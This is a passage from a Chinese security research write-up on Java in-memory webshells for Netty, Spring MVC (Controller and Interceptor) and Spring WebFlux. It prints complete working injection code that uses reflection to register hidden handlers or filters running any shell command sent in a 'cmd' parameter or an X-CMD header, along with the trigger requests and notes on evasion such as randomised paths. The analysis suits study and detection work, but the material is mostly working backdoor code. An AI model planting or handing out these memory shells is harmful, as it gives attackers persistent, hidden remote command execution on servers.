 3. Tomcat/Jetty：理论上 Tomcat 9+ 和 Jetty 支持部分异步特性，但并非 WebFlux 的原生适配容器，实际应用中较少使用（因 Servlet 3.1 异步 API 与响应式模型仍有差异）。
```

```markdown
Spring Cloud Gateway 是基于 Spring WebFlux 和 Netty 构建的 API 网关框架，用于为微服务架构提供统一的入口，核心功能包括路由转发、请求过滤、负载均衡等。以下是其与 Spring WebFlux 和 Netty 的关系解析：
```

| **组件**                 | **角色**                                                     | **技术栈**                   |
| ------------------------ | ------------------------------------------------------------ | ---------------------------- |
| **Spring Cloud Gateway** | 微服务网关，处理所有外部请求，提供路由、限流、认证等功能。   | 基于 Spring WebFlux + Netty  |
| **Spring WebFlux**       | 响应式 Web 框架，提供非阻塞编程模型，支持函数式路由和注解式控制器。 | 基于 Reactor（响应式流规范） |
| **Netty**                | 高性能网络通信框架，提供异步事件驱动的网络编程能力。         | 基于 NIO 实现非阻塞 IO       |

### 2.demo编写

```markdown
这里的复现网上把文章翻烂了都没法复现，基本都是搭建Spring Cloud Gateway靶场复现，但是上面也讲了Netty是底层的网络通信框架，SpringWebFlux项目中默认也是用Netty不可能无法复现。最后看到Bmth佬的一篇[文章](http://www.bmth666.cn/2023/04/15/CVE-2022-22947-SpringCloud-GateWay-SpEL-RCE/index.html)的一句话，才排查出问题
`netty处理http请求是构建一条责任链pipline，http请求会被链上的handler会依次来处理。所以我们的内存马其实就是一个handler`
```

```markdown
查了一下资料，在 Spring WebFlux 中，Handler、Filter 和 Router 是构建响应式 Web 应用的核心组件，它们通过协作处理 HTTP 请求，形成完整的请求处理链。

★`HTTP 请求 → WebHandler（入口） → Filter 链 → Router 匹配 → Handler 执行 → 响应返回`
1. Filter 链预处理
请求首先经过 过滤器链，每个 WebFilter 可以修改请求（如添加请求头）；
2. Router 路由匹配
RouterFunction 或注解控制器根据请求路径、方法等条件匹配对应的 HandlerFunction 或控制器方法。
3. Handler 业务处理
匹配到的 Handler 执行具体业务逻辑，返回响应式类型（如 Mono<ServerResponse>）。

那就闭环了，我们的内存马是一个handler那我就需要在handler前的任意一个流程中去触发doInject()方法，因为内存马这个类不会自动生效，需要主动调用其静态方法 doInject() 才能完成注入操作，所以我在类中注入一个方法，当访问路径 /inject 时，Spring WebFlux 会调用doInject（）方法。

```

```markdown
  //这里我加到了handler类里，Filter、Router类也能触发，只有执行逻辑在handeler之前且参与处理http请求就行。
  @RestController
  public class InjectController {
    @GetMapping("/inject")
    public String inject() {
      return NettyDemo.doInject();
    }
  }
```

![image-20250619173504849](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619173504849.png)

```markdown
//请求inject触发内存马

GET /inject HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 
Content-Type: application/json
```

![image-20250619173631979](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619173631979.png)

```markdown
//加上X-CMD触发内存马

GET /inject HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 
Content-Type: application/json
X-CMD: whoami
```

![image-20250619173745287](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250619173745287.png)

### 3.demo代码分析

#### 3.1.整体流程

```markdown
1.反射查找 NettyWebServer线程
2.通过反射修改 doOnChannelInit字段
3.将自身插入到 Netty 的 ChannelPipeline
```

#### 3.2.注入内存马到 Netty Pipeline 中

```java
public static String doInject()
```

攻击逻辑：

- 反射查找 NettyWebServer 线程：通过 `Thread.getThreads()` 获取 JVM 所有线程，筛选出运行 Netty 的线程。
- 反射获取配置对象链：从线程中层层获取 Netty 配置对象（`val$disposableServer` -> `config` -> `doOnChannelInit`）。
- 替换 `doOnChannelInit` 字段：将内存马实例赋值给该字段，使得后续 channel 初始化时会调用它的 onChannelInit()方法。

简单理解：通过反射操作私有字段，绕过 Spring 的正常注册流程，将恶意 Handler 插入到 Netty 的 pipeline 中。

####  3.3.注册恶意 Handler 到 ChannelPipeline

```java
public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress)
```

攻击逻辑：确保优先级最高, 插入到 pipeline 的最前面，保证每次请求都会被内存马拦截。

```java
pipeline.addBefore("reactor.left.httpTrafficHandler", "memshell_handler", new NettyDemo());
```

简单理解：  劫持 Netty 的请求处理链，确保内存马比业务逻辑更早执行。

# 四.框架系内存马

```markdown
还是那句话Spring Web系列框架对于jsp的解析默认不支持，那么内存马的利用条件会变的比较苛刻，所以这里不搭建可解析jsp的spring项目咯，直接写个恶意class类去复现
```

## 4.1.SpringMVC框架内存马

### 4.1.0.SpringMVC框架Controller组件内存马 demo 编写&代码分析

#### 1.demo 编写

```markdown
要编写一个spring controller型内存马，需要经过以下步骤：
1. 获取WebApplicationContext
2. 获取RequestMappingHandlerMapping实例
3. 通过反射获得自定义Controller的恶意方法的Method对象
4. 定义RequestMappingInfo
5. 动态注册Controller
```

在SpringWeb项目中的Controller写入我们的恶意类

```java
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

@RestController
public class SpringControllerDemo {

  private String getRandomString() {
    String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    StringBuilder randomString = new StringBuilder();
    for (int i = 0; i < 8; i++) {
      int index = (int) (Math.random() * characters.length());
      randomString.append(characters.charAt(index));
    }
    return randomString.toString();
  }

  @RequestMapping("/test2")
  public String inject() throws Exception{
    String controllerName = "/" + getRandomString();
    WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
    Method method = InjectedController.class.getMethod("cmd");
    PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
    RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
    RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
    InjectedController injectedController = new InjectedController();
    requestMappingHandlerMapping.registerMapping(info, injectedController, method);
    return "[+] Inject successfully!<br>[+] shell url: http://localhost:8080" + controllerName + "?cmd=ipconfig";
  }

  @RestController
  public static class InjectedController {

    public InjectedController(){
    }

    public void cmd() throws Exception {
      HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
      HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
      response.setCharacterEncoding("GBK");
      if (request.getParameter("cmd") != null) {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
          isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"/bin/bash", "-c", request.getParameter("cmd")};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.getWriter().write(output);
        response.getWriter().flush();
        response.getWriter().close();
      }
    }
  }
}
```

![image-20250618143601940](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618143601940.png)

访问类中写的test2地址触发内存马，再次重复这个servlet我们可以随便输入，一样可以触发命令执行

![image-20250618143654656](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618143654656.png)

![image-20250618143747044](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618143747044.png)

#### 2.demo代码分析

```java
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Scanner;

@RestController
public class SpringControllerDemo {

  private String getRandomString() {
    String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    StringBuilder randomString = new StringBuilder();
    for (int i = 0; i < 8; i++) {
      int index = (int) (Math.random() * characters.length());
      randomString.append(characters.charAt(index));
    }
    return randomString.toString();
  }

  @RequestMapping("/test2")
  public String inject() throws Exception{
    String controllerName = "/" + getRandomString();
    WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
    Method method = InjectedController.class.getMethod("cmd");
    PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
    RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
    RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
    InjectedController injectedController = new InjectedController();
    requestMappingHandlerMapping.registerMapping(info, injectedController, method);
    return "[+] Inject successfully!<br>[+] shell url: http://localhost:8080" + controllerName + "?cmd=ipconfig";
  }

  @RestController
  public static class InjectedController {

    public InjectedController(){
    }

    public void cmd() throws Exception {
      HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
      HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
      response.setCharacterEncoding("GBK");
      if (request.getParameter("cmd") != null) {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
          isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"/bin/bash", "-c", request.getParameter("cmd")};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.getWriter().write(output);
        response.getWriter().flush();
        response.getWriter().close();
      }
    }
  }
}
```

```markdown
我们先回顾一下Spring Controller型内存马的整体流程

1. 获取WebApplicationContext
2. 获取RequestMappingHandlerMapping实例
3. 通过反射获得自定义Controller的恶意方法的Method对象
4. 定义RequestMappingInfo
5. 动态注册Controller
```

##### 2.1. 获取WebApplicationContext（内存马入口）

```java
WebApplicationContext context = (WebApplicationContext) 
    RequestContextHolder.currentRequestAttributes()
    .getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

**做了什么**： 这是内存马注入的"钥匙"，通过`RequestContextHolder`获取当前线程的请求上下文，进而提取Spring的`WebApplicationContext`（Web应用上下文）。  

**简单理解**： Spring容器管理着所有Bean的生命周期，获取该对象意味着可操作Spring内部组件（如路由表、Bean工厂），这是内存马实现的基础能力。  



##### 2.2. 获取RequestMappingHandlerMapping（路由控制权）

```java
RequestMappingHandlerMapping requestMappingHandlerMapping = 
    context.getBean(RequestMappingHandlerMapping.class);
```

**做了什么**：  获取Spring MVC的URL路由注册中心，`RequestMappingHandlerMapping`负责管理所有Controller的URL映射关系。  

**简单理解**：  通过该对象可动态修改路由表，实现无需修改源码或配置的"无文件"路由注入。  

##### 2.3. 反射获取恶意方法的Method对象

```java
Method method = InjectedController.class.getMethod("cmd");
```

**做了什么**：  将恶意功能cmd方法封装为`Method`对象，作为后续注册的处理器方法。  

**简单理解**：  反射机制允许绕过静态代码检查，直接操作类成员，是内存马常见的技术手段。  



##### 2.4. 定义RequestMappingInfo（伪造路由规则）

```java
PatternsRequestCondition urlPattern = new PatternsRequestCondition(controllerName);
RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
RequestMappingInfo info = new RequestMappingInfo(urlPattern, condition, null, null, null, null, null);
```

**做了什么**：  构造自定义路由规则，包含路径匹配（随机路径）和HTTP方法限制（无限制）。  

**简单理解**：  **路径随机化**，`controllerName`是8位随机字符串（如`/aBcDefgH`），规避传统扫描器的特征检测。  **隐蔽性设计**，未指定HTTP方法（如GET/POST），允许通过任意方法触发。  

![image-20250618151636832](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618151636832.png)

##### 2.5. 动态注册Controller（内存驻留）

```java
InjectedController injectedController = new InjectedController();
requestMappingHandlerMapping.registerMapping(info, injectedController, method);
```

**做了什么**： 将恶意Controller动态注册到Spring路由表中，实现"无文件落地"的后门驻留。  

**简单理解**：  **运行时注入**，修改Spring内部路由映射表，无需重启服务即可生效。  **持久化局限**，内存马依赖进程存活，应用重启后失效（需配合其他持久化技术）。  

---

##### 2.6.恶意载荷分析InjectedController.cmd方法

```java
public void cmd() throws Exception {
  // 获取请求/响应对象
  HttpServletRequest request = ...;
  HttpServletResponse response = ...;
  
  // 命令执行逻辑
  if (request.getParameter("cmd") != null) {
    String[] cmds = isWindows ? ... : ...;
    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
    String output = new Scanner(in, "GBK").useDelimiter("\\A").next();
    response.getWriter().write(output);
  }
}
```

**做了什么**：  实现远程代码执行（RCE）功能，是内存马的实际攻击载荷。  

**简单理解**：  通过`cmd`参数传递命令（如`?cmd=whoami`），实现交互式控制。  自动识别Windows/Linux系统，构建兼容的命令执行参数。  

### 4.1.1.SpringMVC框架 Interceptor 组件内存马demo编写&代码分析

```markdown
★当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层：HttpRequest --> Filter --> DispactherServlet --> `Interceptor` --> Controller,下面的问题就是如何动态地注册一个恶意的Interceptor了。

Spring Interceptor型内存马的编写思路：
1. 获取ApplicationContext
2. 通过AbstractHandlerMapping反射来获取adaptedInterceptors
3. 将要注入的恶意拦截器放入到adaptedInterceptors中

简单思路：
1.获取当前运行环境的上下文
2.实现恶意Interceptor
3.注入恶意Interceptor
```

#### 1.demo编写

选择之前测试的Spring Inyerceptor项目，记得改一下WebConfig.class把注册为拦截器的恶意类改一下，如果报错就按照idea提示修复

![image-20250618172749910](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618172749910.png)

内存马

```java
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class SpringMVCInterceptorDemo implements HandlerInterceptor {

  @ResponseBody
  @RequestMapping("/test3")
  public void Inject() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

    //获取上下文环境
    WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());

    //获取adaptedInterceptors属性值
    org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);
    java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    field.setAccessible(true);
    java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>)field.get(abstractHandlerMapping);


    //将恶意Interceptor添加入adaptedInterceptors
    Shell_Interceptor shell_interceptor = new Shell_Interceptor();
    adaptedInterceptors.add(shell_interceptor);
  }

  @Override
  public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
    return HandlerInterceptor.super.preHandle(request, response, handler);
  }

  public class Shell_Interceptor implements HandlerInterceptor{
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
      String cmd = request.getParameter("cmd");
      if (cmd != null) {
        try {
          Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
          e.printStackTrace();
        } catch (NullPointerException n) {
          n.printStackTrace();
        }
        return true;
      }
      return false;
    }
  }
}
```

先访问内存马地址触发内存马，采用任意传参方式请求任意路径，成功触发命令执行

![image-20250618172117417](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618172117417.png)

![image-20250618172337561](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618172337561.png)

#### 2.demo代码分析

```markdown
这里不分析了直接引用 枫 大佬的分析过程，写的非常好
获取上下文环境
注册恶意Controller
配置路径映射
```

##### 2.0.获取上下文环境Context

有四种方法：

**1.getCurrentWebApplicationContext**

```
WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
```

`getCurrentWebApplicationContext` 获得的是一个 `XmlWebApplicationContext` 实例类型的 `Root WebApplicationContext`。

2.WebApplicationContextUtils

*通过这种方法获得的也是一个* `Root WebApplicationContext`。其中 `WebApplicationContextUtils.getWebApplicationContext` 函数也可以用 `WebApplicationContextUtils.getRequiredWebApplicationContext`来替换。

```
WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
```

**3.RequestContextUtils**

*通过* `ServletRequest` *类的实例来获得* `Child WebApplicationContext`。

```
WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
```

**4.getAttribute**

这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext

```
WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
```

##### 2.1.动态注册Controller

```markdown
Spring Controller 的动态注册，就是对 `RequestMappingHandlerMapping` 注入的过程。

`RequestMappingHandlerMapping`是springMVC里面的核心Bean，spring把我们的controller解析成`RequestMappingInfo`对象，然后再注册进`RequestMappingHandlerMapping`中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。

- RequestMappingHandlerMapping对象本身是spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。
- 在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的`org.springframework.web.context.ContextLoaderListener`，由它来完成IOC容器的初始化和bean对象的注入。
- 另外一个是ApplicationContext是由`org.springframework.web.servlet.DispatcherServlet`完成的，具体是在`org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()`这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。

Spring 2.5 开始到 Spring 3.1 之前一般使用
`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`
映射器 ；

Spring 3.1 开始及以后一般开始使用新的
`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`
映射器来支持@Contoller和@RequestMapping注解。
```

![img](https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-56.png)

1.registerMapping

在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping

```
// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
Method method = (Class.forName("me.landgrey.SSOLogin").getDeclaredMethods())[0];
// 3. 定义访问 controller 的 URL 地址
PatternsRequestCondition url = new PatternsRequestCondition("/hahaha");
// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. 在内存中动态注册 controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName("恶意Controller").newInstance(), method);
```

2.registerHandler

```markdown
参考上面的 `HandlerMapping` 接口继承关系图，针对使用 `DefaultAnnotationHandlerMapping` 映射器的应用，可以找到它继承的顶层类`org.springframework.web.servlet.handler.AbstractUrlHandlerMapping`

在其`registerHandler()`方法中

该方法接受 `urlPath`参数和 `handler`参数，可以在 `this.getApplicationContext()` 获得的上下文环境中寻找名字为 `handler` 参数值的 `bean`, 将 url 和 controller 实例 bean 注册到 `handlerMap` 中
```

```
// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("me.landgrey.SSOLogin").newInstance());
// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);
// 3. 反射获得 registerHandler Method
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod("registerHandler", String.class, Object.class);
m1.setAccessible(true);
// 4. 将 dynamicController 和 URL 注册到 handlerMap 中
m1.invoke(dh, "/favicon", "dynamicController");
```

3.detectHandlerMethods

```markdown
参考上面的 `HandlerMapping` 接口继承关系图，针对使用 `RequestMappingHandlerMapping` 映射器的应用，可以找到它继承的顶层类`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping`

在其`detectHandlerMethods()` 方法中
```

该方法仅接受`handler`参数，同样可以在 `this.getApplicationContext()` 获得的上下文环境中寻找名字为 `handler` 参数值的 `bean`, 并注册 `controller` 的实例 `bean`

```
context.getBeanFactory().registerSingleton("dynamicController", Class.forName("恶意Controller").newInstance());
org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);
java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);
m1.setAccessible(true);
m1.invoke(requestMappingHandlerMapping, "dynamicController");
```

##### 2.3.实现恶意Controller

这里由于我们时动态注册Controller，所以我们只需要实现对应的恶意方法即可

```
public class Controller_Shell{
 
        public Controller_Shell(){}
 
        public void shell() throws IOException {
 
            //获取request
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Runtime.getRuntime().exec(request.getParameter("cmd"));
        }
    }
```

## 4.2.SpringWebFlux框架系列内存马demo编写&代码分析

### 1.demo编写

```java
import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

@Configuration
public class SpringWebFluxDemo implements WebFilter{

  public static void doInject() {
    Method getThreads;
    try {
      getThreads = Thread.class.getDeclaredMethod("getThreads");
      getThreads.setAccessible(true);
      Object threads = getThreads.invoke(null);
      for (int i = 0; i < Array.getLength(threads); i++) {
        Object thread = Array.get(threads, i);
        if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
          NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
          ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
          Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler", false);
          HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,"delegate", false);
          ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,"delegate", true);
          FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,"delegate", true);
          DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler,"chain", false);
          Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
          List<WebFilter> newAllFilters = new ArrayList<>(defaultWebFilterChain.getFilters());
          newAllFilters.add(0, new SpringWebFluxDemo());
          DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
          Field f = filteringWebHandler.getClass().getDeclaredField("chain");
          f.setAccessible(true);
          Field modifersField = Field.class.getDeclaredField("modifiers");
          modifersField.setAccessible(true);
          modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
          f.set(filteringWebHandler, newChain);
          modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
        }
      }
    } catch (Exception ignored) {}
  }

  public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
    Field f;
    if(superClass){
      f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
    }else {
      f = obj.getClass().getDeclaredField(fieldName);
    }
    f.setAccessible(true);
    return f.get(obj);
  }

  public Flux<DataBuffer> getPost(ServerWebExchange exchange) {
    ServerHttpRequest request = exchange.getRequest();
    String path = request.getURI().getPath();
    String query = request.getURI().getQuery();

    if (path.equals("/test2") && query != null && query.startsWith("cmd=")) {
      String cmd = query.substring(4);
      try {
        Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c", cmd});
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
        Flux<DataBuffer> response = Flux.create(sink -> {
          try {
            String line;
            while ((line = reader.readLine()) != null) {
              sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));
            }
            sink.complete();
          } catch (IOException ignored) {}
        });

        exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);
        return response;
      } catch (IOException ignored) {}
    }
    return Flux.empty();
  }

  @Override
  public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
    if (exchange.getRequest().getURI().getPath().startsWith("/test2")) {
      doInject();
      Flux<DataBuffer> response = getPost(exchange);
      ServerHttpResponse serverHttpResponse = exchange.getResponse();
      serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);
      return serverHttpResponse.writeWith(response);
    } else {
      return chain.filter(exchange);
    }
  }
}

```

直接请求地址直接执行命令，无需触发。

![image-20250618182145492](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618182145492.png)

### 2.demo代码分析

这里直接引用W01fh4cker师傅的分析过程，我这里只做个简单的总结

```markdown
1. 线程扫描与目标定位
通过反射调用 Thread.getThreads() 获取所有线程，遍历查找类名包含 NettyWebServer 的线程对象，该对象是 WebFlux 基于 Netty 的服务器实例。

2. 反射链穿透组件层级
从 NettyWebServer 开始，通过多级反射获取核心组件链：NettyWebServer → ReactorHttpHandlerAdapter → 
DelayedInitializationHttpHandler → HttpWebHandlerAdapter → ExceptionHandlingWebHandler → FilteringWebHandler → DefaultWebFilterChain最终获取封装过滤器链的 DefaultWebFilterChain 对象。

3. 篡改过滤器链
	●提取原始过滤器列表 filters，创建新列表 newFilters。
	●将自定义恶意过滤器 SpringWebFluxDemo 插入到 newFilters 的首位（索引 0），确保优先执行。
	●使用原始处理器 handler 和新过滤器列表，通过反射调用 DefaultWebFilterChain 构造函数创建新链 newChain。
4. 绕过 final 限制并替换
	●反射获取 FilteringWebHandler 的私有 final 字段 chain。
	●通过修改 modifiers 字段临时移除 final 修饰符，将 chain 字段的值替换为 newChain。
	●恢复 final 修饰符，保持类的封装性，完成内存马注入。
5. 恶意请求处理逻辑
